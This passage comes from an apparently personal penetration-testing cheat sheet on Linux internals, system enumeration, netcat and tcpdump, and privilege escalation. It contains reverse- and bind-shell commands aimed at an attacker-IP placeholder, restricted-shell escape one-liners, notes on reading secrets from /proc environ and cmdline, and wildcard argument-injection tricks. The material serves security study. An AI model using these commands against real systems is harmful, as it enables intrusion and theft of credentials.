<li>File sizes are zero (/proc/meminfo). The truth is that the kernel gathers statistics about memory when a process requests them from /proc</li>
<li>Structure:<ul>
<li><a href="https://www.thegeekdiary.com/understanding-the-proc-file-system/">https://www.thegeekdiary.com/understanding-the-proc-file-system/</a></li>
<li><a href="https://en.wikipedia.org/wiki/Procfs#Linux">https://en.wikipedia.org/wiki/Procfs#Linux</a></li>
<li><a href="http://www.noah.org/wiki//proc">http://www.noah.org/wiki//proc</a></li>
</ul>
</li>
<li>Implementation details:<ul>
<li><a href="https://www.kernel.org/doc/Documentation/filesystems/proc.txt">https://www.kernel.org/doc/Documentation/filesystems/proc.txt</a></li>
<li><a href="https://elixir.bootlin.com/linux/v5.8-rc4/source/fs/proc">https://elixir.bootlin.com/linux/v5.8-rc4/source/fs/proc</a></li>
<li><a href="https://github.com/torvalds/linux/tree/master/fs/proc">https://github.com/torvalds/linux/tree/master/fs/proc</a></li>
</ul>
</li>
<li>Important items:<ul>
<li><code>/proc/PID/cmdline</code>:  which contains the command which originally started the process<ul>
<li>Read confidential information passed in as arguments</li>
</ul>
</li>
<li><code>/proc/PID/environ</code>: a file containing the names and contents of the environment variables that affect the process<ul>
<li>Read confidential information passed in as environment variables (specially useful in containerized environments, since this is a common practice)</li>
</ul>
</li>
<li><code>/proc/PID/mem</code>: a binary image representing the process's virtual memory, can only be accessed by a ptrace'ing process <ul>
<li>Useful in  <a href="https://shafiqvinales.wordpress.com/2017/09/14/dump-a-linux-processs-memory-to-file/">dumping process memory</a>, but with <a href="https://stackoverflow.com/a/12980874">limitations</a></li>
</ul>
</li>
<li><code>/proc/PID/maps</code>: the memory map showing which addresses currently visible to that process are mapped to which regions in RAM or to files<ul>
<li>Useful in binary exploitation (offset calculations, etc.)</li>
</ul>
</li>
<li><code>/proc/cpuinfo</code>: containing information about the CPU<ul>
<li>Identifying CPU architecture. Useful in binary exploitations to create matching payloads.</li>
</ul>
</li>
<li><code>/proc/version</code>: containing the Linux kernel version, distribution number, gcc version number used to build the kernel and any other pertinent information relating to the version of the kernel currently running<ul>
<li>Identifying operating system related information architecture. Useful in binary exploitations to create matching payloads.</li>
</ul>
</li>
<li><code>/proc/net/</code>: a directory containing useful information about the network stack, in particular /proc/net/nf_conntrack, which lists existing network connections<ul>
<li>Get information about network stack and connections.</li>
</ul>
</li>
<li><code>/proc/modules</code>: containing a list of the kernel modules currently loaded . It gives some indication (not always entirely correct) of dependencies. <ul>
<li>Useful in binary exploitations to create matching payloads.</li>
</ul>
</li>
<li><code>/proc/mounts</code>: a symlink to self/mounts which contains a list of the currently mounted devices and their mount points <ul>
<li>Get information about the mounted devices (for example: through LFI)</li>
</ul>
</li>
<li><code>/proc/kcore</code>: represents the physical memory of the system (kernel virtual address space region of memory) and is stored in the ELF core file format. (examined by gdb, objdump)<ul>
<li><code>/dev/kmem</code>: gives access to the kernel's virtual memory space</li>
<li><code>/dev/mem</code>: gives access to physical memory.</li>
</ul>
</li>
<li><code>/proc/kmsg</code>: used to hold messages generated by the kernel (picked by /bin/dmesg).</li>
</ul>
</li>
</ul>
</li>
<li>Sysfs<ul>
<li>Structured approach to clean-up procfs</li>
<li>expose the readable and writable properties of what the kernel calls "kobjects" to userspace</li>
<li>purpose of kobjects is reference-counting: when the last reference to a kobject is deleted, the system will reclaim the resources associated with it<ul>
<li><a href="https://www.kernel.org/doc/Documentation/kobject.txt">https://www.kernel.org/doc/Documentation/kobject.txt</a></li>
</ul>
</li>
<li>constitutes most of the kernel's famous "<a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/Documentation/ABI/stable">stable ABI to userspace</a>" which no one may ever, <a href="https://lkml.org/lkml/2012/12/23/75">under any circumstances, "break."</a> </li>
<li>eBPF (extended Berkeley Packet Filter) consists of a virtual machine running inside the kernel that privileged users can query from the command line</li>
<li>running eBPF tools on a booted system shows instead what the kernel actually does</li>
<li><a href="https://github.com/iovisor/bcc/tree/master/tools">https://github.com/iovisor/bcc/tree/master/tools</a></li>
<li><a href="https://github.com/iovisor/bcc/blob/master/tools/vfscount_example.txt">vfscount</a> or <a href="https://github.com/iovisor/bcc/blob/master/tools/vfsstat.py">vfsstat</a></li>
<li>Used by udev to access device and device driver information</li>
<li>Sysfs helped clean up the proc file system because much of the hardware information has been moved from proc to sysfs</li>
<li>Important items:<ul>
<li>/sys/bloc: information about block devices</li>
<li>/sys/bus: physical bus type supported in the kernel</li>
<li>/sys/class: devices classes registered</li>
<li>/sys/devices: global device hierarchy of all devices on the system</li>
<li>/sys/firmware: firmware objects and attributes</li>
<li>/sys/module: subdirectories for each module that is loaded into the kernel</li>
<li>/sys/power: system power state can be controlled from this directory.</li>
</ul>
</li>
</ul>
</li>
<li>sysctl<ul>
<li>Usable to change values in <code>/proc/sys</code> directory</li>
<li>View current kernel configuration: <code>sysctl -a</code></li>
<li><code>echo 1 &gt; /proc/sys/net/ipv4/ip_forward</code></li>
<li><code>sysctl -w net.ipv4.ip_forward=1</code></li>
<li>To make permanent changes, add to <code>/etc/sysctl.conf</code></li>
</ul>
</li>
</ul>
</li>
<li>General information:
  <div class="highlight"><pre><span></span><code>cat /proc/version
uname -a
uname -mrs
rpm -q kernel
dmesg | grep Linux
ls /boot | grep vmlinuz-
</code></pre></div></li>
<li>Kernel tuning:<ul>
<li>Temporary: <code>sysctl</code><ul>
<li><code>sysctl -w net.ipv4.ip_forward=1</code></li>
</ul>
</li>
<li>Permanent: <code>/etc/sysctl.conf</code></li>
<li>View configuration: <code>sysctl -a | less</code></li>
<li>View  configuration files for the installed modprobe modules:
  <div class="highlight"><pre><span></span><code>ls -l /etc/modprobe.d/
ls -R /lib/modules/$( uname -r )/kernel
</code></pre></div></li>
</ul>
</li>
<li>Kernel Modules:<ul>
<li>loadable kernel modules, or LKMs. - Linux has the capability of adding some modules to the kernel without going through rebuilding kernel</li>
<li>rootkit embeds itself into the kernel of the operating systems, often through these LKMs</li>
<li>Insert module: <ul>
<li><code>insmod</code></li>
<li><code>modprobe -a &lt;module name&gt;</code></li>
</ul>
</li>
<li>Remove module: <code>modprobe -r &lt;module name&gt;</code> <code>rmmod</code></li>
<li>List modules: <code>modprobe -l &lt;module name&gt;</code> <code>lsmod</code></li>
<li>Module info: <code>modinfo bluetooth</code></li>
<li>View logs: <code>dmesg</code> </li>
</ul>
</li>
<li>Solaris<ul>
<li>(IOCTLs) are used for communication between user-mode applications and the kernel<ul>
<li>List IOCTLs on Solaris Kernel: <ul>
<li><code>cd on-src/usr/src/uts</code></li>
<li><code>grep -rnw -e _IOR -e _IOW -e _IOWR *</code> </li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="startup-process">Startup Process<a class="headerlink" href="#startup-process" title="Permanent link">&para;</a></h3>
<p><img alt="" src="https://img.wonderhowto.com/img/44/77/63591930046359/0/linux-basics-for-aspiring-hacker-using-start-up-scripts.w1456.jpg" /></p>
<blockquote>
<p><a href="https://null-byte.wonderhowto.com/how-to/linux-basics-for-aspiring-hacker-using-start-up-scripts-0168875/">https://null-byte.wonderhowto.com/how-to/linux-basics-for-aspiring-hacker-using-start-up-scripts-0168875/</a></p>
</blockquote>
<ul>
<li>Run levels
    <div class="highlight"><pre><span></span><code>0 - halt the system
1 - single user mode (minimal services)
2 - multi-user mode
3 - multi-user mode
4 - multi-user mode
5 - multi-user mode
6 - reboot the system
</code></pre></div></li>
<li>Init.d Process<ul>
<li>Has process ID: 1</li>
<li><code>/etc/init.d</code> scripts with 755 permission</li>
<li>init process then hands over the boot-up processes to <code>rc.d</code> daemon</li>
</ul>
</li>
<li>rc.local - Script to start necessary processes in the background when the system boots up: <code>/etc/init.d/rc.local</code></li>
<li>You can add services for the rc.d script to run at startup using the update-rc.d command.<ul>
<li><code>update-rc.d &lt;name of the script or service&gt; &lt;remove|defaults|disable|enable&gt;</code></li>
<li><code>update-rc.d postgresql defaults</code> Run at startup</li>
</ul>
</li>
<li>GUI for startup tasks: <code>rcconf</code></li>
</ul>
<h3 id="daemons">Daemons<a class="headerlink" href="#daemons" title="Permanent link">&para;</a></h3>
<ul>
<li><code>inetd</code>, <code>xinetd</code> - Inetd always runs in the background and it then decides when to start and stop other daemons.</li>
<li><code>rlinetd</code>
    <div class="highlight"><pre><span></span><code>rlinetd.conf
/etc/rlinetd.d
</code></pre></div><ul>
<li>Disable unnecessary demons</li>
<li>Configure IPs that can access a demon</li>
</ul>
</li>
</ul>
<h3 id="managing-disks">Managing Disks<a class="headerlink" href="#managing-disks" title="Permanent link">&para;</a></h3>
<ul>
<li>Managing Hard Disks<ul>
<li><code>hda</code> for hard disks.</li>
<li><code>sda</code> for newer SATA disks (SCSI).</li>
<li>Partitions within <code>sda</code> are <code>sda1</code>, <code>sda2</code>, ...</li>
</ul>
</li>
<li>Basic disk Information: <code>df -h</code></li>
<li>Partitions on disk: <code>fdsisk -l</code></li>
<li>Block device information: <code>lsblk</code></li>
<li>Editing and displaying partitions: <code>parted</code> / <code>cfdisk</code><ul>
<li><code>(parted) print</code></li>
<li><code>(parted) select /dev/sdb</code></li>
</ul>
</li>
<li>Change HDD parameters: <code>hdparm</code></li>
<li>Information about mounts: <code>df -h</code></li>
<li>Check errors: <code>fsck</code> after <code>umount</code>. <code>-p</code> to auto fix.</li>
</ul>
<ul>
<li>Debugfs<ul>
<li>Simple-to-use RAM-based file system specially designed for debugging purposes</li>
<li>Mount file system (usable to access <code>/root</code> by only being in <code>disk</code> group)
  <div class="highlight"><pre><span></span><code>debugfs /dev/sda1
</code></pre></div></li>
</ul>
</li>
<li><code>dd if=/dev/sdb of=/root/flashcopy</code> (block size 512)</li>
<li><code>dd if=/dev/media of=/root/flashcopy bs=4096 conv:noerror</code></li>
</ul>
<h3 id="permissions">Permissions<a class="headerlink" href="#permissions" title="Permanent link">&para;</a></h3>
<p><img alt="" src="../_assets/2020-08-09-17-02-13.png" /></p>
<ul>
<li>Linux automatically assigns base permissions—usually 666 for files and 777 for directorie<ul>
<li><code>umask</code> method represents the permissions you want to remove from the base permissions on a file or directory to make them more secure</li>
<li><code>umask</code> number is subtracted from the permissions number to give the new permissions status</li>
<li>Debian systems, the umask is preconfigured to 022<ul>
<li>644 for files</li>
<li>755 for directories</li>
</ul>
</li>
</ul>
</li>
</ul>
<p><img alt="" src="../_assets/2020-08-09-17-37-42.png" /></p>
<ul>
<li>File Permissions:
    <div class="highlight"><pre><span></span><code>0 = No Permission
1 = Execute
2 = Write
4 = Read
</code></pre></div>
    <div class="highlight"><pre><span></span><code>r w x
4 2 1 = 7
</code></pre></div></li>
<li>Setuid - Set User ID - The process's effective user ID gets set to that of the program file itself (rather than that of the user running it).<ul>
<li><code>S</code> - just the setuid bit</li>
<li><code>s</code> - setuid bit and execute x</li>
<li>Dir - No effect on DIRs</li>
<li>Find SUID: <code>find . -perm /4000</code></li>
</ul>
</li>
<li>Setgid - Set Group ID - The process's effective group ID gets set to that of the program file (rather than that of the user's primary group).<ul>
<li>Dir - any files created in that directory will have the same group as that directory</li>
<li><a href="http://www.tutonics.com/2012/12/linux-file-permissions-chmod-umask.html">http://www.tutonics.com/2012/12/linux-file-permissions-chmod-umask.html</a></li>
<li>Find GUID: <code>find . -perm /2000</code></li>
</ul>
</li>
<li>Find SUID / SGID: <code>find . -perm /6000</code></li>
<li>Find and ls SUID / SGID: <code>find "$DIRECTORY" -perm /6000 -exec ls -la {} \;</code></li>
<li>Searching world writable files: <code>find / -perm -w ~ -type l -ls 2?/dev/null</code></li>
<li>Check file permissions of <code>/etc/passwd</code> and <code>/etc/shadow</code></li>
<li>Find writable files: <code>find -type f -maxdepth 1 -writable</code></li>
</ul>
<h3 id="processes">Processes<a class="headerlink" href="#processes" title="Permanent link">&para;</a></h3>
<ul>
<li>Running processes: <code>ps aux</code> <code>ps -ef</code> <code>top</code></li>
<li>Tree of processes (processes &amp; threads): <code>pstree -aclp</code></li>
<li>Process priority: <code>nice -n -20 &lt;command&gt;</code> <code>renice &lt;nice-value&gt; &lt;pid&gt;</code><ul>
<li><code>-20</code> is highest priority</li>
<li><code>19</code> is lowest priority</li>
</ul>
</li>
<li>Memory map for a process: <code>cat /proc/1234/maps</code> <code>gdb&gt; info proc mappings</code> <code>pmap -d 1234</code></li>
<li><code>/proc</code>
    - <code>/proc/&lt;id&gt;/environ</code> environment variables
    - <code>/proc/&lt;id&gt;/cmdline</code> command line args/command used to run the process
    - <code>/proc/&lt;id&gt;/maps</code> memory map
    - <code>/proc/&lt;id&gt;/fd</code> open file descriptors</li>
<li>Trace system and library calls<ul>
<li><code>ltrace</code></li>
<li><code>strace</code></li>
</ul>
</li>
<li>Access control<ul>
<li><code>access</code> - Check permissions for the UID and GID of the process (executable file owner / group)<ul>
<li>Check is done using the calling process's real UID and GID, rather than the effective IDs as is done when actually attempting an operation (e.g., open(2)) on the file.</li>
</ul>
</li>
</ul>
</li>
<li>Process ID of a port: <code>fuser -n tcp (PORT NUMBER)</code> <code>ps aux | grep $(fuser -n tcp 45295 | awk '{print $2}')</code></li>
</ul>
<h3 id="services">Services<a class="headerlink" href="#services" title="Permanent link">&para;</a></h3>
<ul>
<li>List of Services: <code>cat /etc/services</code></li>
<li>Commons service configurations
    <div class="highlight"><pre><span></span><code>cat /etc/syslog.conf
cat /etc/chttp.conf
cat /etc/lighttpd.conf
cat /etc/cups/cupsd.conf
cat /etc/inetd.conf
cat /etc/apache2/apache2.conf
cat /etc/my.conf
cat /etc/httpd/conf/httpd.conf
cat /opt/lampp/etc/httpd.conf
ls -aRl /etc/ | awk &#39;$1 ~ /^.*r.*/
</code></pre></div></li>
<li>Check if certain service is up: <code>update-­‐rc.d ssh enable</code></li>
<li>Auto start a service: <code>update-­‐rc.d ssh enable</code></li>
<li>Systemd services: <code>/lib/systemd/system/snapd.service</code></li>
<li>Systemd socket unit file:
    <div class="highlight"><pre><span></span><code>[Socket]
ListenStream=/run/snapd.socket
ListenStream=/run/snapd-snap.socket
SocketMode=0666
</code></pre></div><ul>
<li><code>0666</code> - Allow any process to connect and communicate with the socket.</li>
</ul>
</li>
</ul>
<h3 id="networking">Networking<a class="headerlink" href="#networking" title="Permanent link">&para;</a></h3>
<ul>
<li>Interface Information
    <div class="highlight"><pre><span></span><code>/sbin/ifconfig -a
cat /etc/network/interfaces
cat /etc/sysconfig/network
</code></pre></div></li>
<li>Network configuration
    <div class="highlight"><pre><span></span><code>cat /etc/resolv.conf
cat /etc/sysconfig/network
cat /etc/networks
iptables -L
hostname
dnsdomainname
</code></pre></div></li>
<li>Monitor network communication
    <div class="highlight"><pre><span></span><code>lsof -i
lsof -i :80
grep 80 /etc/services
netstat -antup
netstat -antpx
netstat -tulpn
chkconfig --list
chkconfig --list | grep 3:on
last
w
</code></pre></div></li>
<li>Cached IP and Mac Information
    <div class="highlight"><pre><span></span><code>arp -e
route
/sbin/route -nee
</code></pre></div></li>
<li>Change IP
    <div class="highlight"><pre><span></span><code>ifconfig eth0 192.168.1.115
ifconfig eth0 192.168.1.115 netmask 255.255.255.0 broadcast 192.168.1.255
</code></pre></div></li>
<li>Shell with built-in tools
    <div class="highlight"><pre><span></span><code>nc -lvp 4444### Attacker. Input (Commands)
nc -lvp 4445### Attacker. Ouput (Results)
telnet [atackers ip] 44444 | /bin/sh | [local ip] 44445### On the targets system. Use the attackers IP!
</code></pre></div><ul>
<li><a href="https://www.lanmaster53.com/2011/05/7-linux-shells-using-built-in-tools/">https://www.lanmaster53.com/2011/05/7-linux-shells-using-built-in-tools/</a></li>
</ul>
</li>
<li><code>AF_UNIX</code> - Used to communicate between processes on the same machine</li>
<li><code>AF_INET</code> and <code>AF_INET6</code> - Used for processes to communicate over a network connection.</li>
<li>Interact with AF_UNIX Socket
    <div class="highlight"><pre><span></span><code>nc -U /run/snapd.socket
GET / HTTP/1.1
Host: 127.0.0.1
</code></pre></div></li>
<li>Process ID of a port: <code>fuser -n tcp (PORT NUMBER)</code> <code>ps aux | grep $(fuser -n tcp 45295 | awk '{print $2}')</code></li>
</ul>
<p><strong>Tools</strong></p>
<ul>
<li>Ship - one-stop-shop for basic network reconnaissance and addressing: <a href="https://github.com/xtonousou/ship.git">https://github.com/xtonousou/ship.git</a> <a href="https://null-byte.wonderhowto.com/how-to/linux-basics-for-aspiring-hacker-using-ship-for-quick-handy-ip-address-information-0181593/">https://null-byte.wonderhowto.com/how-to/linux-basics-for-aspiring-hacker-using-ship-for-quick-handy-ip-address-information-0181593/</a> </li>
</ul>
<h3 id="tools">Tools<a class="headerlink" href="#tools" title="Permanent link">&para;</a></h3>
<ul>
<li>grep<ul>
<li>Color word root: <code>grep --color root /etc/passwd</code></li>
<li>OR: <code>grep -e how -e to -e forge *.txt</code></li>
<li><a href="https://www.howtoforge.com/tutorial/linux-grep-command/">https://www.howtoforge.com/tutorial/linux-grep-command/</a></li>
</ul>
</li>
</ul>
<table>
<thead>
<tr>
<th align="left">Option</th>
<th align="left">Details</th>
</tr>
</thead>
<tbody>
<tr>
<td align="left"><code>-i</code></td>
<td align="left">Ignore case</td>
</tr>
<tr>
<td align="left"><code>-r</code> <code>-R</code></td>
<td align="left">Recursive  <code>grep -R "example" /etc/apache2/</code></td>
</tr>
<tr>
<td align="left"><code>-w</code></td>
<td align="left">Match words</td>
</tr>
<tr>
<td align="left"><code>-e</code></td>
<td align="left">Regex match <code>grep -w -e 'word1|word2' /path/to/file</code></td>
</tr>
<tr>
<td align="left"><code>-n</code></td>
<td align="left">Line number</td>
</tr>
<tr>
<td align="left"><code>-c</code></td>
<td align="left">Count</td>
</tr>
<tr>
<td align="left"><code>-v</code></td>
<td align="left">Invert</td>
</tr>
<tr>
<td align="left"><code>-x</code></td>
<td align="left">Exact match</td>
</tr>
<tr>
<td align="left"><code>-l</code></td>
<td align="left">File names with match</td>
</tr>
<tr>
<td align="left"><code>-L</code></td>
<td align="left">File names without match</td>
</tr>
</tbody>
</table>
<ul>
<li>iptables<ul>
<li>count packets sent and received
  <div class="highlight"><pre><span></span><code>iptables -Z &amp;&amp; iptables -F
iptables -I INPUT 1 -s IP -j ACCEPT
iptables -I OUTOUT 1 -d IP -j ACCEPT
ip tables -vn -L
</code></pre></div></li>
</ul>
</li>
<li>Netcat<ul>
<li>Chat
  <div class="highlight"><pre><span></span><code>nc -nlvp 4444
nc -nv &lt;ip&gt; 4444
</code></pre></div></li>
<li>File Transfer
  <div class="highlight"><pre><span></span><code>nc -nlvp 4444 &gt; file.exe  
nc -nv &lt;ip&gt; 4444 &lt; file.exe
</code></pre></div></li>
<li>Bind Shell<ul>
<li>VICTIM (server): <code>nc -lvp 4444 -e cmd.exe</code></li>
<li>ATTACKER (client): <code>nc -nv &lt;IP Address&gt; 4444</code></li>
</ul>
</li>
<li>Reverse Shell<ul>
<li>ATTACKER (server): <code>nc -lvp 4444</code></li>
<li>VICTIM (client): <code>nc -nv &lt;IP Address&gt; 4444 -e cmd.exe</code></li>
</ul>
</li>
<li>NCAT for increased security<ul>
<li>VICTIM (server): <code>ncat -lvp 4444 -e cmd.exe --allow 192.168.30.5 --ssl</code></li>
<li>ATTACKER (client): <code>ncat -nv &lt;IP Address&gt; 4444 --ssl</code></li>
</ul>
</li>
<li>Port Scanning<ul>
<li>TCP Connect Port Scan: <code>nc -nvv -w 1 -z &lt;ip&gt; 1-65550</code></li>
<li>UDP Scan: <code>nc -unvv -w 1 -z &lt;ip&gt; 1-65550</code></li>
</ul>
</li>
</ul>
</li>
<li>tcpdump<ul>
<li>Packet Capture
  <div class="highlight"><pre><span></span><code>tcpdump tcp dst [ip] [port] and tcp dst [ip] [port]
tcpdump tcp dst 192.168.1.7 80 and tcp dst 10.5.5.252 21
</code></pre></div></li>
<li>Open a PCAP: <code>tcpdump -­r password_cracking_filtered.pcap</code></li>
<li>Cut only IP addresses from the traffic: <code>tcpdump -­r password_cracking_filtered.pcap  | awk-­‐F" " '{print $3}' | sort -­‐u | head</code></li>
<li>Filter Destination or Source
  <div class="highlight"><pre><span></span><code>tcpdump -n src host &lt;ip&gt; -­r password_cracking_filtered.pcap
tcpdump -n dst host &lt;ip&gt; ‐r password_cracking_filtered.pcap
tcpdump -n port &lt;port&gt; -­r password_cracking_filtered.pcap
</code></pre></div></li>
<li>Advanced Header Filtering: <code>tcpdump -A -n 'tcp[13] = 24' -­‐r password_cracking_filtered.pcap</code>
  <img alt="" src="https://github.com/ayomawdb/cheatsheets/raw/master/.data/.images/tcpdump_001.png" /></li>
<li>Other important flags<ul>
<li><code>-nn</code> stop DNS and service names lookup (performance+)</li>
<li><code>-X</code> and <code>-XX</code> can be used to print each packet in hex and ascii</li>
<li><code>-A</code> print packets in ASCII</li>
<li><code>-S</code> to print absolute sequence numbers</li>
<li><code>-s</code> can be used to increase the default snap-length from 262144 to higher</li>
<li><code>-s</code> 0 to capture full packet</li>
</ul>
</li>
<li>References:<ul>
<li><a href="https://hackertarget.com/tcpdump-examples/">https://hackertarget.com/tcpdump-examples/</a></li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="general-exploits">General Exploits<a class="headerlink" href="#general-exploits" title="Permanent link">&para;</a></h2>
<p><strong>Enumeration Scripts</strong></p>
<ul>
<li>BeRoot: <a href="https://github.com/AlessandroZ/BeRoot/tree/master/Linux">https://github.com/AlessandroZ/BeRoot/tree/master/Linux</a></li>
<li>unix-privesc-check: <a href="https://github.com/pentestmonkey/unix-privesc-check">https://github.com/pentestmonkey/unix-privesc-check</a></li>
<li>linuxprivchecker.py: <a href="http://www.securitysift.com/download/linuxprivchecker.py">http://www.securitysift.com/download/linuxprivchecker.py</a></li>
<li>LinEnum: <a href="https://github.com/rebootuser/LinEnum">https://github.com/rebootuser/LinEnum</a></li>
<li>Lse.sh: <a href="https://github.com/diego-treitos/linux-smart-enumeration">https://github.com/diego-treitos/linux-smart-enumeration</a></li>
<li>LinPEAS: <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite">https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite</a></li>
</ul>
<p><strong>Escape shell</strong></p>
<ul>
<li>Information about environment:
    <div class="highlight"><pre><span></span><code>env
echo $PATH
echo /usr/local/rbin/*
</code></pre></div></li>
<li>List read only variables (check If PATH or SHELL is writable): <code>export -p</code></li>
<li>VI / VIM: <code>:set shell=/bin/bash</code> <code>:shell</code> <code>:sh</code> | <code>:! /bin/bash</code>| <code>:r /root/root.txt</code> | <code>:e /root/root.txt</code></li>
<li>AWK: <code>awk 'BEGIN {system("/bin/sh")}'</code></li>
<li>Find: <code>find / -name blahblah -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;</code></li>
<li>More / Less / Man: <code>! /bin/sh</code> <code>!/bin/sh</code> <code>!bash</code></li>
<li>Tee: <code>echo "evil script code" | tee script.sh</code></li>
<li>Languages
    <div class="highlight"><pre><span></span><code>python: <span class="nv">exit_code</span> <span class="o">=</span> os.system<span class="o">(</span><span class="s1">&#39;/bin/sh&#39;</span><span class="o">)</span> <span class="nv">output</span> <span class="o">=</span> os.popen<span class="o">(</span><span class="s1">&#39;/bin/sh&#39;</span><span class="o">)</span>.read<span class="o">()</span>
perl -e <span class="s1">&#39;exec &quot;/bin/sh&quot;;&#39;</span>
perl: <span class="nb">exec</span> <span class="s2">&quot;/bin/sh&quot;</span><span class="p">;</span>
ruby: <span class="nb">exec</span> <span class="s2">&quot;/bin/sh&quot;</span>
lua: os.execute<span class="o">(</span><span class="s1">&#39;/bin/sh&#39;</span><span class="o">)</span>
irb<span class="o">(</span>main:001:0&gt; <span class="nb">exec</span> <span class="s2">&quot;/bin/sh&quot;</span>
</code></pre></div></li>
<li>Copy files into <code>$PATH</code></li>
<li>Copy file into <code>HOME</code> (scp/ftp)</li>
<li>Some restricted shells will start by running some files in an unrestricted mode (If your <code>.bash_profile</code> is executed in an restricted mode and it's editable)</li>
<li>If <code>HISTFILE</code> and <code>HISTSIZE</code> are writable:<ul>
<li>Set <code>HISTFILE</code> to the file you want to overwrite (preferably an executable)</li>
<li>Set <code>HISTSIZE</code> to 0 and then back to 100,</li>
<li>Then execute the lines you want in your shell script</li>
</ul>
</li>
<li><a href="https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells">https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells</a></li>
<li><a href="https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/">https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/</a></li>
</ul>
<p><strong>Wildcards</strong></p>
<table>
<thead>
<tr>
<th align="left">Char</th>
<th align="left">Description</th>
</tr>
</thead>
<tbody>
<tr>
<td align="left">*</td>
<td align="left">Any number of characters, including none.</td>
</tr>
<tr>
<td align="left">?</td>
<td align="left">Any single character.</td>
</tr>
<tr>
<td align="left">[ ]</td>
<td align="left">Set of characters, any one of which may match a single character at that position.</td>
</tr>
<tr>
<td align="left">-</td>
<td align="left">Used within [ ] denotes a range of characters.</td>
</tr>
<tr>
<td align="left">~</td>
<td align="left">At the beginning of a word expands to the name of your home directory.  If you append another user's login name to the character, it refers to that user's home directory.</td>
</tr>
</tbody>
</table>
<ul>
<li>Using wildcard to inject arguments
    <div class="highlight"><pre><span></span><code><span class="c1"># ls -al</span>
drwxrwxr-x.  <span class="m">2</span> leon   leon   <span class="m">4096</span> Oct <span class="m">28</span> <span class="m">17</span>:04 DIR1
drwxrwxr-x.  <span class="m">2</span> leon   leon   <span class="m">4096</span> Oct <span class="m">28</span> <span class="m">17</span>:04 DIR2
-rw-rw-r--.  <span class="m">1</span> leon   leon      <span class="m">0</span> Oct <span class="m">28</span> <span class="m">17</span>:03 file1.txt
-rw-rw-r--.  <span class="m">1</span> leon   leon      <span class="m">0</span> Oct <span class="m">28</span> <span class="m">17</span>:03 file2.txt
-rw-rw-r--.  <span class="m">1</span> nobody nobody    <span class="m">0</span> Oct <span class="m">28</span> <span class="m">16</span>:38 -rf

<span class="c1"># rm *</span>
<span class="c1"># ls -al</span>
-rw-rw-r--.  <span class="m">1</span> nobody nobody    <span class="m">0</span> Oct <span class="m">28</span> <span class="m">16</span>:38 -rf

<span class="c1"># strace rm *</span>
execve<span class="o">(</span><span class="s2">&quot;/bin/rm&quot;</span>, <span class="o">[</span><span class="s2">&quot;rm&quot;</span>, <span class="s2">&quot;DIR1&quot;</span>, <span class="s2">&quot;DIR2&quot;</span>, <span class="s2">&quot;file1.txt&quot;</span>, <span class="s2">&quot;file2.txt&quot;</span>, <span class="s2">&quot;-rf&quot;</span><span class="o">]</span>, <span class="o">[</span>/* <span class="m">25</span> vars */<span class="o">])</span> <span class="o">=</span> <span class="m">0</span>
</code></pre></div></li>
<li>chown
    <div class="highlight"><pre><span></span><code>--reference=RFILE
        use RFILE&#39;s owner and group rather than specifying OWNER:GROUP values
</code></pre></div>
    <div class="highlight"><pre><span></span><code><span class="c1"># ls -la</span>
-rw-r--r--.  <span class="m">1</span> leon leon    <span class="m">0</span> Oct <span class="m">28</span> <span class="m">17</span>:40 .drf.php
-rw-rw-r--.  <span class="m">1</span> user user  <span class="m">117</span> Oct <span class="m">28</span> <span class="m">17</span>:35 inc.php
-rw-rw-r--.  <span class="m">1</span> user user  <span class="m">111</span> Oct <span class="m">28</span> <span class="m">17</span>:38 index.php
-rw-rw-r--.  <span class="m">1</span> leon leon    <span class="m">0</span> Oct <span class="m">28</span> <span class="m">17</span>:45 --reference<span class="o">=</span>.drf.php

<span class="c1"># chown -R nobody:nobody *.php</span>

<span class="c1"># ls -la</span>
-rw-r--r--.  <span class="m">1</span> leon leon    <span class="m">0</span> Oct <span class="m">28</span> <span class="m">17</span>:40 .drf.php
-rw-rw-r--.  <span class="m">1</span> leon leon  <span class="m">117</span> Oct <span class="m">28</span> <span class="m">17</span>:35 inc.php
-rw-rw-r--.  <span class="m">1</span> leon leon  <span class="m">111</span> Oct <span class="m">28</span> <span class="m">17</span>:38 index.php
-rw-rw-r--.  <span class="m">1</span> leon leon    <span class="m">0</span> Oct <span class="m">28</span> <span class="m">17</span>:45 --reference<span class="o">=</span>.drf.php
</code></pre></div></li>
<li>chmod
    <div class="highlight"><pre><span></span><code>--reference<span class="o">=</span>RFILE
            use RFILE<span class="err">&#39;</span>s mode instead of MODE values
</code></pre></div>
    <div class="highlight"><pre><span></span><code><span class="c1"># ls -la</span>
-rwxrwxrwx.  <span class="m">1</span> leon leon     <span class="m">0</span> Oct <span class="m">29</span> <span class="m">00</span>:40 .drf.php
-rw-rw-r--.  <span class="m">1</span> user user   <span class="m">117</span> Oct <span class="m">28</span> <span class="m">17</span>:36 inc.php
-rw-rw-r--.  <span class="m">1</span> user user   <span class="m">111</span> Oct <span class="m">28</span> <span class="m">17</span>:38 index.php
-rw-r--r--.  <span class="m">1</span> leon leon     <span class="m">0</span> Oct <span class="m">29</span> <span class="m">00</span>:41 --reference<span class="o">=</span>.drf.php

<span class="c1"># chmod 000 *</span>

<span class="c1"># ls -la</span>
-rwxrwxrwx.  <span class="m">1</span> leon leon     <span class="m">0</span> Oct <span class="m">29</span> <span class="m">00</span>:40 .drf.php
-rwxrwxrwx.  <span class="m">1</span> user user   <span class="m">117</span> Oct <span class="m">28</span> <span class="m">17</span>:36 inc.php
-rwxrwxrwx.  <span class="m">1</span> user user   <span class="m">111</span> Oct <span class="m">28</span> <span class="m">17</span>:38 index.php
-rw-r--r--.  <span class="m">1</span> leon leon     <span class="m">0</span> Oct <span class="m">29</span> <span class="m">00</span>:41 --reference<span class="o">=</span>.drf.php
</code></pre></div></li>
<li>tar command Execution
    <div class="highlight"><pre><span></span><code>--checkpoint<span class="o">[=</span>NUMBER<span class="o">]</span>
    display progress messages every NUMBERth record <span class="o">(</span>default <span class="m">10</span><span class="o">)</span>

--checkpoint-action<span class="o">=</span>ACTION
